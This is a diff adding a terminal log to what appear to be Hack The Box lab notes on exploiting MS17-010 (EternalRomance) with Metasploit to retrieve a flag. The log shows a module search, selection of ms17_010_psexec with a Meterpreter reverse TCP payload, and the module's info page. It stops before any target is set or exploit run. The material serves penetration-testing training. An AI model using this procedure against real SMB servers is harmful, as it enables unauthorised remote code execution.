@@ -773,3 +773,143 @@ Answer the question(s) below to complete the section
 
 Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.
 
+```
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-gdqkq5ypmw]─[~]
+└──╼ [★]$ msfconsole -q
+[msf](Jobs:0 Agents:0) >> search eternalromance
+
+Matching Modules
+================
+
+   #   Name                                  Disclosure Date  Rank    Check  Description
+   -   ----                                  ---------------  ----    -----  -----------
+   0   exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   1     \_ target: Automatic                .                .       .      .
+   2     \_ target: PowerShell               .                .       .      .
+   3     \_ target: Native upload            .                .       .      .
+   4     \_ target: MOF upload               .                .       .      .
+   5     \_ AKA: ETERNALSYNERGY              .                .       .      .
+   6     \_ AKA: ETERNALROMANCE              .                .       .      .
+   7     \_ AKA: ETERNALCHAMPION             .                .       .      .
+   8     \_ AKA: ETERNALBLUE                 .                .       .      .
+   9   auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   10    \_ AKA: ETERNALSYNERGY              .                .       .      .
+   11    \_ AKA: ETERNALROMANCE              .                .       .      .
+   12    \_ AKA: ETERNALCHAMPION             .                .       .      .
+   13    \_ AKA: ETERNALBLUE                 .                .       .      .
+
+
+Interact with a module by name or index. For example info 13, use 13 or use auxiliary/admin/smb/ms17_010_command
+
+[msf](Jobs:0 Agents:0) >> use 6
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> info
+
+       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+     Module: exploit/windows/smb/ms17_010_psexec
+   Platform: Windows
+       Arch: x86, x64
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+  Disclosed: 2017-03-14
+
+Provided by:
+  sleepya
+  zerosum0x0
+  Shadow Brokers
+  Equation Group
+
+Module side effects:
+ unknown-side-effects
+
+Module stability:
+ unknown-stability
+
+Module reliability:
+ unknown-reliability
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Automatic
+      1   PowerShell
+      2   Native upload
+      3   MOF upload
+
+Check supported:
+  Yes
+
+Basic options:
+  Name               Current Setting    Required  Description
+  ----               ---------------    --------  -----------
+  DBGTRACE           false              yes       Show extra debug trace info
+  LEAKATTEMPTS       99                 yes       How many times to try to lea
+                                                  k transaction
+  NAMEDPIPE                             no        A named pipe that can be con
+                                                  nected to (leave blank for a
+                                                  uto)
+  NAMED_PIPES        /usr/share/metasp  yes       List of named pipes to check
+                     loit-framework/da
+                     ta/wordlists/name
+                     d_pipes.txt
+  RHOSTS                                yes       The target host(s), see http
+                                                  s://docs.metasploit.com/docs
+                                                  /using-metasploit/basics/usi
+                                                  ng-metasploit.html
+  RPORT              445                yes       The Target port (TCP)
+  SERVICE_DESCRIPTI                     no        Service description to be us
+  ON                                              ed on target for pretty list
+                                                  ing
+  SERVICE_DISPLAY_N                     no        The service display name
+  AME
+  SERVICE_NAME                          no        The service name
+  SHARE              ADMIN$             yes       The share to connect to, can
+                                                   be an admin share (ADMIN$,C
+                                                  $,...) or a normal read/writ
+                                                  e folder share
+  SMBDomain          .                  no        The Windows domain to use fo
+                                                  r authentication
+  SMBPass                               no        The password for the specifi
+                                                  ed username
+  SMBUser                               no        The username to authenticate
+                                                   as
+
+Payload information:
+  Space: 3072
+
+Description:
+  This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where
+  primitive. This will then be used to overwrite the connection session information with as an
+  Administrator session. From there, the normal psexec payload code execution is done.
+
+  Exploits a type confusion between Transaction and WriteAndX requests and a race condition in
+  Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy
+  exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a
+  named pipe.
+
+References:
+  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
+  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
+  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
+  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
+  https://github.com/worawit/MS17-010
+  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
+  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/
+  https://attack.mitre.org/techniques/T1021/002/
+  https://attack.mitre.org/techniques/T1059/
+  https://attack.mitre.org/techniques/T1059/001/
+  https://attack.mitre.org/techniques/T1077/
+  https://attack.mitre.org/techniques/T1569/002/
+
+Also known as:
+  ETERNALSYNERGY
+  ETERNALROMANCE
+  ETERNALCHAMPION
+  ETERNALBLUE
+
+
+View the full module info with the info -d command.
+
+
+```
